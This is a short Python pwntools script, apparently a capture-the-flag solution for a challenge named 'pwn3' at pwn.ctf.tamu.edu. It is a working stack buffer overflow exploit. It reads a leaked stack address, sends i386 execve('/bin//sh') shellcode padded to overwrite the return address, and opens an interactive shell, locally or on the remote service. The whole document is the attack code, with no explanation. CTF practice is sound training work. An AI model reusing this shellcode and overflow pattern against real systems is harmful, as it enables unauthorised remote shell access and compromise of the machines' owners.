from pwn import *
import time
import sys


def exploit():
    raw_input('wait')
    proc.recvuntil('Your random number ')
    stack = int(proc.recv(10), 16)
    print(hex(stack))
    shellcode = '\x31\xc0\x31\xc9\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\xb0\x0b\xcd\x80'
    buf = shellcode
    buf += 'A' * (0xee + 4 - len(buf)) + p32(stack)
    proc.sendline(buf)


if __name__ == '__main__':
    context.arch = 'i386'
    connect = 'nc pwn.ctf.tamu.edu 4323'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./pwn3'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
